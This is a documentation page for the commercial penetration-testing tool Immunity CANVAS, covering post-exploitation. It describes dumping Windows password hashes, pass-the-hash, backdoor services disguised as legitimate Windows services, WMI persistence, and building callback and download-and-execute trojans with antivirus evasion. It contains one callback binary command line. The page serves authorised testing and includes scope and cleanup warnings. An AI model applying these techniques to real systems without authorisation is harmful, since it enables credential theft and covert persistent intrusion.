

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>Post-Exploitation &mdash; Immunity CANVAS 1 documentation</title>
  

  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
  

  

  
    <link rel="top" title="Immunity CANVAS 1 documentation" href="index.html"/>
        <link rel="next" title="Canvas Tips and Tricks" href="canvas_tips.html"/>
        <link rel="prev" title="Exploiting Client-Side Vulnerablities" href="basics_clientside.html"/> 

  
  <script src="_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="index.html" class="icon icon-home"> Immunity CANVAS
          

          
          </a>

          
            
            
              <div class="version">
                1
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
                <ul class="current">
<li class="toctree-l1"><a class="reference internal" href="license.html">CANVAS EULA</a></li>
<li class="toctree-l1"><a class="reference internal" href="install.html">Installing CANVAS</a></li>
<li class="toctree-l1"><a class="reference internal" href="terminology.html">Terminology</a></li>
<li class="toctree-l1"><a class="reference internal" href="canvas_intro.html">Getting Started</a></li>
<li class="toctree-l1"><a class="reference internal" href="canvas_basics.html">CANVAS Basic Usage</a></li>
<li class="toctree-l1"><a class="reference internal" href="basics_win_remote.html">Exploiting Windows Remotely</a></li>
<li class="toctree-l1"><a class="reference internal" href="basics_win_local.html">Exploiting Windows Locally (Privilege Escalation)</a></li>
<li class="toctree-l1"><a class="reference internal" href="basics_clientside.html">Exploiting Client-Side Vulnerablities</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="">Post-Exploitation</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#take-screen-shots">Take Screen shots</a></li>
<li class="toctree-l2"><a class="reference internal" href="#dumping-password-hashes">Dumping Password hashes</a></li>
<li class="toctree-l2"><a class="reference internal" href="#persistent-access">Persistent Access</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#installing-mosdef-service">Installing MOSDEF Service</a></li>
<li class="toctree-l3"><a class="reference internal" href="#installing-mosdef-service-remotely">Installing MOSDEF Service Remotely</a></li>
<li class="toctree-l3"><a class="reference internal" href="#connecting-to-mosdef-service">Connecting to MOSDEF Service</a></li>
<li class="toctree-l3"><a class="reference internal" href="#wmi-persistence">WMI Persistence</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#mosdef-trojans">MOSDEF Trojans</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#creating-mosdef-trojan">Creating MOSDEF Trojan</a></li>
<li class="toctree-l3"><a class="reference internal" href="#dns-callback-trojan">DNS Callback Trojan</a></li>
<li class="toctree-l3"><a class="reference internal" href="#http-downloader-trojan">HTTP Downloader Trojan</a></li>
<li class="toctree-l3"><a class="reference internal" href="#mosdef-dll-trojan">MOSDEF DLL Trojan</a></li>
<li class="toctree-l3"><a class="reference internal" href="#mosdef-powershell-trojan">MOSDEF PowerShell Trojan</a></li>
<li class="toctree-l3"><a class="reference internal" href="#mosdef-war-jsp-trojan">MOSDEF WAR (JSP) Trojan</a></li>
<li class="toctree-l3"><a class="reference internal" href="#compiled-binary-trojans">Compiled Binary Trojans</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="canvas_tips.html">Canvas Tips and Tricks</a></li>
<li class="toctree-l1"><a class="reference internal" href="canvas_videos.html">Canvas Video Tutorials</a></li>
<li class="toctree-l1"><a class="reference internal" href="canvas_advanced.html">CANVAS Advanced Usage</a></li>
<li class="toctree-l1"><a class="reference internal" href="canvas_strategic.html">CANVAS Strategic</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="index.html">Immunity CANVAS</a>
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          

 



<div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="index.html">Docs</a> &raquo;</li>
      
    <li>Post-Exploitation</li>
      <li class="wy-breadcrumbs-aside">
        
          
            <a href="_sources/post_exploitation.txt" rel="nofollow"> View page source</a>
          
        
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="post-exploitation">
<h1>Post-Exploitation<a class="headerlink" href="#post-exploitation" title="Permalink to this headline">¶</a></h1>
<p>Once we have access to the node, you will likely want to gather information from that node to further penetrate the network. Depending on the privilege gained, it is possible to gather file and registry information, dump password hashes or even attack other machines inside the network from
the exploited machine.</p>
<div class="section" id="take-screen-shots">
<h2>Take Screen shots<a class="headerlink" href="#take-screen-shots" title="Permalink to this headline">¶</a></h2>
<p>Often, a screen-shot from the desktop of the machine is used as proof of success in gaining remote access. This can be accomplished by running the <code class="docutils literal"><span class="pre">screengrab</span></code> module. Once finished successfully, the captured image is transferred back to the CANVAS system, and stored in <em>CANVAS_DIRECTORY/Sessions/default/{machine-IP}/</em>.
To view all of screen shots click on the &#8216;Screen Shots&#8217; button on top of the main CANVAS GUI window.</p>
<img alt="_images/canvas_screenshots.png" src="_images/canvas_screenshots.png" />
<p>Double-clicking any of the stored screen shots opens them in a new window.</p>
</div>
<div class="section" id="dumping-password-hashes">
<h2>Dumping Password hashes<a class="headerlink" href="#dumping-password-hashes" title="Permalink to this headline">¶</a></h2>
<p>Gathering passwords is a great way to regain access to a node in the future, or if passwords are reused, to access to other machines in the network. CANVAS includes a few options to gather passwords, including dumping Windows password hashes. This typically requires SYSTEM or administrative access to the OS. If the node is not running with SYSTEM or Administrator, the privileges must first be escalated by exploiting another local privilage escalation vulnerablity. This is often the case when you gain access to the remote system through web based RCE (Remote Command Execution) exploits,
or when access is gained using a client-side attack.</p>
<p>To obtain password hashes select the node from the Node Tree and select the <code class="docutils literal"><span class="pre">getpasswordhashes</span></code> module. Certain conditions need to be satisfied to get password hashes. These conditions are explained in the Exploit Description tab of the module. In most cases the module automatically takes care of many of the required actions, such as migrating to LSASS.EXE proess. Once the process is completed, hashes are displayed in the CANVAS Log tab and are also stored in a text file for offline cracking with free tools such as <a class="reference external" href="http://www.openwall.com/john/">John-The-Ripper</a> or <a class="reference external" href="http://hashcat.net/oclhashcat/">HashCat</a> .</p>
<img alt="_images/canvas_gethashes.png" src="_images/canvas_gethashes.png" />
<p>There is a huge performance difference between the two tools. <em>John-The-Ripper</em> uses
only the processing power of the CPU, which works fine but is rather slow if you
have only one CPU on your machine or it is not a powerful processor. <em>HashCat</em> on the
other hand, uses the processing power of the graphic card GPU. Even lower end GPUs
are tens of times faster than a powerful CPU, when it comes to bruteforcing password
hashes. If you have a decent ATI or Nvidia graphic card, <em>HashCat</em> should be your primary
choice.</p>
<div class="admonition tip">
<p class="first admonition-title">Tip</p>
<p class="last">CANVAS supports &#8216;Pass-The-Hash &lt;<a class="reference external" href="https://en.wikipedia.org/wiki/Pass_the_hash">https://en.wikipedia.org/wiki/Pass_the_hash</a>&gt;&#8217;_
technique in Windows related modules. With Pass-The-Hash you can simply use dumped hash value directly into password fields without having to know the actual password. This technique works only on services that accept  LM or NTLM authentication. If the service you need to interact with does not have a dedicated module in CANVAS (Microsoft RDP for instance), you can still use this technique with 3rd party PTH ready tools. <em>FreeRDP</em> for example, natively supports using NT/NTLM hashes instead of passwords for authentication.</p>
</div>
<p>There is more than just one set of stored passwords in Windows OS that you might want
to dump. Windows also stores NTLM hash of logged in users. On a standalone machine, a machine not joined to a Domain, this would give you the same NTLM hashes if you have already dumped the SAM database via <code class="docutils literal"><span class="pre">getpasswordhashes</span></code> module. If the exploited machine is a member of a Windows domain however, using the module &#8216;getloggedinhashes&#8217; will also dump locally cached password hashes of other domain users that have authenticated to the target node. In larger domain networks it is very common to find technical support or even domain-admin accounts credentials stored on member machines.</p>
<img alt="_images/canvas_loggedinhashes.png" src="_images/canvas_loggedinhashes.png" />
<div class="admonition tip">
<p class="first admonition-title">Tip</p>
<p class="last">You can also use third party tools such as <strong>Mimikatz</strong> to exploit some known design flaws
in WIndows OS, and directly dump clear-text password from the memory!</p>
</div>
<div class="admonition warning">
<p class="first admonition-title">Warning</p>
<p class="last">Using third party tools such as Mimikatz involves uploading binary files to
the remote machine, which means writing data to disk and leaving traces. CANVAS
does the process of dumping hashes all in memory, without touching the disk.
If you need to perform your penetration test covertly and avoid getting detected
by monitoring systems and softwares, you have to consider this point, and also the
fact that most of 3rd party hacking tools are detected by Anti-virus softwares, thus
revealing your presense on the remote machine.</p>
</div>
<p>If your target machine is a laptop, you may want to also try dumping stored WEP/WPA Wireless
keys using the <code class="docutils literal"><span class="pre">WiFi_Key_Dumper</span></code> module, or dump entire memory using <code class="docutils literal"><span class="pre">ram_dumper</span></code> and
look for interesting patterns or data, such as cryptgraphy keys.</p>
</div>
<div class="section" id="persistent-access">
<h2>Persistent Access<a class="headerlink" href="#persistent-access" title="Permalink to this headline">¶</a></h2>
<p>When  performing penetration tests, it is often required to do more than just a password dump or screen-shot the target machine as the proof of your work. You will often end up using that machine to explore around, gather information from the local file system or connected networks, or even use that host to exploit rest of machines in a connected network.</p>
<p>Such actions, also known as lateral movement, are often time consuming. Relying on a session that has been obtained from an exploit for an extended period of time may not be the best idea. Connections might drop for various reasons, the remote process might be terminated or crash, or the remote user might simply reboot the machine. While you can try to exploit the machine again, it is not always possible for instance when you exploit a SingleShot vulnerablity, or you have gained your access through client-side attacks.</p>
<p>In such cases, one of the first actions on the remote machine should be stablizing access so that you can  connect back to the same machine without much effort and resume your work. In other words, plant a backdoor on the remote machine.</p>
<div class="admonition warning">
<p class="first admonition-title">Warning</p>
<p class="last">Installing trojans and backdoors on machines during penetration tests is not always permitted by clients! Make sure you have this is in scope and that backdoors or trojans are cleaned up when done.</p>
</div>
<p>If you have gained your access by exploiting a process that might be closed by machine user, such as Internet Explorer, it is better to quickly migrate to another process that is more likely to last, such as one of windows services (if you have the privilege), or the explorer process. You can use the <code class="docutils literal"><span class="pre">mosdefmigrate</span></code> to do that. This module injects an instance of MOSDEF into the specified process, and then overwrite handles so that the current MOSDEF session is automatically migrated to the new process and resumed.</p>
<div class="section" id="installing-mosdef-service">
<h3>Installing MOSDEF Service<a class="headerlink" href="#installing-mosdef-service" title="Permalink to this headline">¶</a></h3>
<p>CANVAS provides a number of methods and modules to stabilize access. One of easiest and most stable (also least covert!) options is to install a MOSDEF service on the remote windows machine. MOSDEF Service is an instance of MOSDEF listener that starts with Windows during the boot process, and listens on the specified port for new connections.</p>
<p>MOSDEF service authenticates incoming connection requests with a defined password, before allowing access. To install this backdoor service, once you have the target node selected, within the <em>Trojans</em> category in modules list, launch the <code class="docutils literal"><span class="pre">installmosdefservice</span></code> module.</p>
<img alt="_images/canvas_installmosdef.png" src="_images/canvas_installmosdef.png" />
<p>Configuring the service is straightforward. Specify a listening TCP port, a password (use complex passwords!) and Windows service name and description texts. Make sure the port you are specifying is not firewalled. Also, you should avoid using default names, and try coming up with names and descriptions that mimic legitimate Windows services so the MOSDEF service is harder to spot when administrators check running processes or started windows services. Once the installation process is finished, you can verify if the service has properly started or not, by using the <code class="docutils literal"><span class="pre">ps</span></code> module which lists currently running processes on the machine, located at <em>Commands &gt; Windows &gt; All Windows &gt; ps</em> .</p>
</div>
<div class="section" id="installing-mosdef-service-remotely">
<h3>Installing MOSDEF Service Remotely<a class="headerlink" href="#installing-mosdef-service-remotely" title="Permalink to this headline">¶</a></h3>
<p>There is an alternative method for deployment and installation of MOSDEF service available.
If you have valid credentials (clear-text passwords or NT/LM hashes) with administrative privileges for the remote machine, you can remotely install the MOSDEF service through MS-RPC calls. No exploits required. This is the preferred method to start exploring remote machines once you have successfully compromised a username with administrative access over other machines. Since we are not exploiting any vulnerablities on Windows or 3rd party software, there is less risk of stability issues or crashing a service or the system.</p>
<div class="admonition warning">
<p class="first admonition-title">Warning</p>
<p class="last">If you are going to deploy the MOSDEF service on multiple machines at the same time
it is strongly recommended to check your scenario and targeted OS version in your test environment first!
In some environments (for example a host with configured EMET) MOSDEF shellcode might not function properly.</p>
</div>
<p>The only requirements for this method to work is that MS-RPC service needs to be accessible remotely, and valid credentials with administrative access on the remote machine.</p>
<p>The <code class="docutils literal"><span class="pre">installremotemosdefservice</span></code> in <em>Trojans</em> group is the module used to deploy the trojans. Configuration is very similar to the MOSDEF service installation. In addition to service name and descriptions the username, password [and domain name] to connect over RPC are required.</p>
<img alt="_images/canvas_installmosdef_remote.png" src="_images/canvas_installmosdef_remote.png" />
<div class="admonition tip">
<p class="first admonition-title">Tip</p>
<p class="last">CANVAS supports Pass-The-Hash technique. In many modules, it is possible to directly use NT/LM password hashes instead of clear-text passwords, avoiding the need crack the hashes.</p>
</div>
<div class="admonition tip">
<p class="first admonition-title">Tip</p>
<p class="last">You can deploy MOSDEF service on multiple remote machines at the same time,   for example when you have domain-admin credentials. Simply select multiple targets before executing the module.</p>
</div>
</div>
<div class="section" id="connecting-to-mosdef-service">
<h3>Connecting to MOSDEF Service<a class="headerlink" href="#connecting-to-mosdef-service" title="Permalink to this headline">¶</a></h3>
<p>Once the MOSDEF services is deployed , use the <code class="docutils literal"><span class="pre">connecttoservice</span></code> module in <em>Trojans</em> tree to access the node. Before closing your MOSDEF session with the node, it is recommended to test that the deployment was successful. CANVAS allows you to have multiple MOSDEF sessions with the same host, so there is no need to terminate your existing session to test the new MOSDEF service.</p>
<img alt="_images/canvas_connecttoservice.png" src="_images/canvas_connecttoservice.png" />
<p>When running the module, specify the same TCP port number and password previously specified during service installation.</p>
<div class="admonition tip">
<p class="first admonition-title">Tip</p>
<p class="last">There are more advanced methods and modules to stabilize your access on remote machines which are covered in other sections of this guide. CANVAS comes with its own Rootkit, which can communicate over covert channels and you can deploy it like MOSDEF. Another option is creating callback MOSDEF trojans that repeatedly call back to you in specified time periods.</p>
</div>
<div class="admonition tip">
<p class="first admonition-title">Tip</p>
<p class="last">If you require modern APT level implants deployed on your target machines, you should check Immunity&#8217;s <strong>INNUENODO</strong>.</p>
</div>
</div>
<div class="section" id="wmi-persistence">
<h3>WMI Persistence<a class="headerlink" href="#wmi-persistence" title="Permalink to this headline">¶</a></h3>
<p>Since version 7.08 CANVAS supports an additional persistent method based on WMI, which is another powerful and built in
feature of Windows. This presistence module creates a new WMI object which can be customized in different ways. The module allows automatic trigger (to launch a callback trojan for example) using three different startup methods:</p>
<blockquote>
<div><ul class="simple">
<li>At boot</li>
<li>At Windows logon</li>
<li>On daily basis at given time (HH:MM)</li>
</ul>
</div></blockquote>
<p>The module can also be customized to trigger based on any WMI event or query. Execution of this module requires an active PowerShell node since the module generates and executes Powershell scripts on the target machine.
Note that <strong>using this module requires administrative privileges</strong> on the target machine. There are several advantages to using this module as a method of persistent.  It is harder to detect by Anti-virus software and detection and removal of it is more complex since it requires a deeper knowledge about WMI to remove. Read the <code class="docutils literal"><span class="pre">wmi_persistent</span></code> module notes in CANVAS for more technical details.</p>
<img alt="_images/wmi_persistence.png" src="_images/wmi_persistence.png" />
<p>There are two callback options. The default option is to create a persistent PowerShell callback trojan. Note that if this option is selected, ensure that there is a CANVAS listener configured to receive the callback. The second option is to execute a custom binary which can be anything, including any of the binary trojans that CANVAS can generate for Windows.</p>
<p>The module can optionally generate an uninstall script. This is necessary to disable and remove the changes made to the system to create the WMI persistent object. To uninstall the WMI object on the target machine, this Powershell uninstall script needs to be executed on the remote machine.</p>
<div class="admonition tip">
<p class="first admonition-title">Tip</p>
<p class="last">If you are performing penetration tests against clients, it is always recommended and in some cases mandatory,  to clean up and remove or restore all the changes made to the exploited system.</p>
</div>
</div>
</div>
<div class="section" id="mosdef-trojans">
<h2>MOSDEF Trojans<a class="headerlink" href="#mosdef-trojans" title="Permalink to this headline">¶</a></h2>
<p>Deploying a service remotely or obtaining a callback session by exploiting vulnerabilities are not the only ways to have a MOSDEF session on a remote machine. CANVAS can generate standalone MOSDEF trojans in different formats and for multiple platforms and architectures. Such trojan files can either be executed as a one-time use solution, or become a presistent trojan if used as an auto-start task or process in the OS.</p>
<div class="section" id="creating-mosdef-trojan">
<h3>Creating MOSDEF Trojan<a class="headerlink" href="#creating-mosdef-trojan" title="Permalink to this headline">¶</a></h3>
<p>The easiest way to get a running MOSDEF node from a remote machine is to create an
executable MOSDEF binary. MOSDEF call back binaries can be created from the CANVAS GUI, or by using the generic pre-compiled binaries for different platforms that are provided in the CANVAS package.
Grabbing the pre-compiled binaries from the CANVAS package is of course easier, but to use them you should always manually specify the call back IP address and port. If you build your own trojan version using CANVAS however, you can hardcode IP/Hostname and port as well as different options such as call back type and using secure channels or encrypted shellcode.</p>
<img alt="_images/canvas_trojans.png" src="_images/canvas_trojans.png" />
<p>The most common type of MOSDEF trojan that you can build and use, as highlighted in the above screen-shot is the standard MOSDEF callback, which is a Windows, Linux or Unix binary that will call back to the hardcoded IP and port.
Hardcoding this information is essential in some scenarios, such as when you are embedding the trojan inside an email or bind it to another executable file.</p>
<img alt="_images/canvas_trojan_build.png" src="_images/canvas_trojan_build.png" />
<p>Options you specify when creating the trojan need to be considered and remembered as they will are required to configure the CANVAS listener used to handle callbacks from the generated trojan.</p>
<img alt="_images/canvas_listener_create.png" src="_images/canvas_listener_create.png" />
<p>Specifying the <em>universal</em> option while building is typically a safe bet, unless there are outbound traffic firewalling and filtering policies applied in your target network which may force you to use HTTP, SSL or even DNS callback trojans. The option <em>HTTP MOSDEF</em> will make the callback connection tunneled over HTTP protocol. This gives the benefit of evading some protocol filterings in corporate networks that allow only limited set of protocols to leave the network. Moreover, if the client has to use a proxy to reach the Internet, the trojan will automatically use the proxy. To make the trojan traffic even harder to detect for middle proxy and firewall devices between you and your target, you can also enable the <em>SSL</em> option, which will tunneling the trojan callback connection over SSL.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">At the moment HTTP/SSL support for MOSDEF trojan callbacks are limited to the Windows platform. Other platforms might be supported in the future.</p>
</div>
<p>The <em>encrypted</em> option tells the CANVAS to encrypt the payload, which will make it harder for some malware detection tools to easily detect the shellcode based on signatures.</p>
</div>
<div class="section" id="dns-callback-trojan">
<h3>DNS Callback Trojan<a class="headerlink" href="#dns-callback-trojan" title="Permalink to this headline">¶</a></h3>
<p>You can also create trojan binaries (for Windows) that communicate over the DNS protocol, by using <code class="docutils literal"><span class="pre">BuildDNSCallback</span></code> module. Although this is more of a proof of concept quality implementation, it still can be used for testing how your network security devices handle such malicious traffic.</p>
<p>The DNS callback trojan works by encoding and wraping MOSDEF traffic into standard DNS protocol, resolve the IP address of specified domain name and tries to make DNS queries to that IP over port 53 which is the standard port for the DNS protocol. Do not forget to set the port for DNS listener you create to port 53 as well. In current implementation, only direct DNS communications is supported. The connection will succeed only if the client can directly resolve and connect to the CANVAS DNS listener. If no direct interntet connection is possible, and DNS queries are handled via an internal DNS server which tries to resolve and cache queries, the connection will fail.</p>
<img alt="_images/canvas_trojan_dns.png" src="_images/canvas_trojan_dns.png" />
<p>The <em>Proxy Address</em> option should be left at 127.0.0.1 unless you know what you are doing. What happens under the hood while using the DNS trojan is that, it works as a proxy to convert and tunnel normal TCP connections of MOSDEF over DNS. The same happens in the reverse order at CANVAS, where incoming DNS packets are decoded and then passed to a Win32 MOSDEF listener.</p>
</div>
<div class="section" id="http-downloader-trojan">
<h3>HTTP Downloader Trojan<a class="headerlink" href="#http-downloader-trojan" title="Permalink to this headline">¶</a></h3>
<p>The <code class="docutils literal"><span class="pre">BuildHTTPcallback</span></code> module let you create a simple HTTP download and execute payload. Once the payload is executed, it will attempt to download a file from the URL you have specified over HTTP(S) and execute it. This is especially useful in cases where you want to deliver an executable payload other than a MOSDEF callback, for example a different trojan or RAT.</p>
<img alt="_images/canvas_trojan_http.png" src="_images/canvas_trojan_http.png" />
</div>
<div class="section" id="mosdef-dll-trojan">
<h3>MOSDEF DLL Trojan<a class="headerlink" href="#mosdef-dll-trojan" title="Permalink to this headline">¶</a></h3>
<p>If a target has an insecure DLL loading vulnerablity, which allows injecting arbitrary DLL file into the software, the  <code class="docutils literal"><span class="pre">BuildMOSDEFDLL</span></code> can be used to generate a callback DLL (of whichever type is specified). Once the DLL is loaded and the DLLMain method from it is called, it will connect back to the CANVAS listener to deliver a MOSDEF session.</p>
<img alt="_images/canvas_trojan_dll.png" src="_images/canvas_trojan_dll.png" />
</div>
<div class="section" id="mosdef-powershell-trojan">
<h3>MOSDEF PowerShell Trojan<a class="headerlink" href="#mosdef-powershell-trojan" title="Permalink to this headline">¶</a></h3>
<p>CANVAS provides yet another type of callback trojan for Windows, using Windows Powershell script. PowerShell is a very powerful scripting language built into Windows operating systems since Windows Vista. Using the module <code class="docutils literal"><span class="pre">BuildPowershellCallback</span></code> you can create a PS script that will connect back to CANVAS. Once connected, you can use the common functionalities PS node type provides or upgrade it to a full MOSDEF node type. One of the advantages of PS over binary MOSDEF trojans is the lower chance of getting detected by Anti-virus software. It is also useful in hardened Windows domain environments, in which workstations are restricted to only run authorized executable files but PowerShell might be allowed form administrative reasons.</p>
</div>
<div class="section" id="mosdef-war-jsp-trojan">
<h3>MOSDEF WAR (JSP) Trojan<a class="headerlink" href="#mosdef-war-jsp-trojan" title="Permalink to this headline">¶</a></h3>
<p>One of the easiest ways to achieve code execution on a vulnerable Tomcat or JBoss application server is by deploying a WAR package to the server that contains JSP files to execute arbitrary commands.</p>
<p>CANVAS can create WAR packages based on the options you specify to be directly deployed on the server. The <code class="docutils literal"><span class="pre">BuildWARCallbackTrojan</span></code> takes care of all the preparation work. The CANVAS WAR file also detects the OS platform automatically and will select the appropriate binary files to execute.</p>
<img alt="_images/canvas_trojan_war.png" src="_images/canvas_trojan_war.png" />
</div>
<div class="section" id="compiled-binary-trojans">
<h3>Compiled Binary Trojans<a class="headerlink" href="#compiled-binary-trojans" title="Permalink to this headline">¶</a></h3>
<p>If you prefer using the provided binaries, or even modify or compile your own binaries from source code, you can find them in <code class="docutils literal"><span class="pre">CANVAS_DIRECTORY\backdoors\mosdef_callbacks</span></code> folder. The standard provided binary in the CANVAS package might be detected by the heuristic engine of some
Anti-Virus software. In those cases, having the source code or binaries in hand provides an opportunity to apply Anti-Virus evasion techniques on the binary to make it undetectable. To execute the provided binaries, specify the IP address and the port, for example <code class="docutils literal"><span class="pre">mosdef_callback_universal_win32.exe</span> <span class="pre">172.16.1.100</span> <span class="pre">5555</span></code> where the IP address belongs to a host with a generic MOSDEF listener started  on port 5555.</p>
<img alt="_images/canvas_mosdef_callbacks.png" src="_images/canvas_mosdef_callbacks.png" />
<div class="admonition tip">
<p class="first admonition-title">Tip</p>
<p class="last">If you have executed the binary and CANVAS shows the incoming connection but nothing happens after that, it is likely that the binary and listener types do not match. For example executing  <code class="docutils literal"><span class="pre">mosdef_callback.exe</span></code> requires <code class="docutils literal"><span class="pre">WIN32</span> <span class="pre">MOSDEF</span> <span class="pre">INTEL</span> <span class="pre">``</span> <span class="pre">,</span>&nbsp; <span class="pre">but</span> <span class="pre">the</span> <span class="pre">listener</span> <span class="pre">was</span> <span class="pre">configured</span> <span class="pre">to</span> <span class="pre">be</span> <span class="pre">of</span> <span class="pre">the</span> <span class="pre">type</span> <span class="pre">``Universal</span> <span class="pre">MOSDEF</span></code></p>
</div>
</div>
</div>
</div>


           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="canvas_tips.html" class="btn btn-neutral float-right" title="Canvas Tips and Tricks" accesskey="n">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="basics_clientside.html" class="btn btn-neutral" title="Exploiting Client-Side Vulnerablities" accesskey="p"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2016, Immunity Inc..

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'./',
            VERSION:'1',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true
        };
    </script>
      <script type="text/javascript" src="_static/jquery.js"></script>
      <script type="text/javascript" src="_static/underscore.js"></script>
      <script type="text/javascript" src="_static/doctools.js"></script>

  

  
  
    <script type="text/javascript" src="_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>